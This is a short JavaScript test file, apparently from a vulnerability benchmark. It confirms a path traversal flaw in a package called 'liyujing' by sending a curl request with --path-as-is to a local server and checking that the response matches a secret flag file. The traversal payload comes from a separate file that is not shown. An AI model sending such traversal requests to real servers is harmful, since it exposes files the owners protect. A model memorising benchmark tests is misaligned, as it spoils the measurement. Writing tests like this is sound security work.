test("Path Traversal in liyujing", (done) => {
  const { startServer } = require("./function.js");
  const { getPayload } = require('./payload.js');

  expect.assertions(1);  // Ensure an assertion is called

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${getPayload()}"`;

  startServer();

  sleep.sleep(2); // Wait for the server to start

  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(require("fs").readFileSync(pathToFlag).toString());  // Verify the output
    done();  // Call done to mark the test as completed
  });
});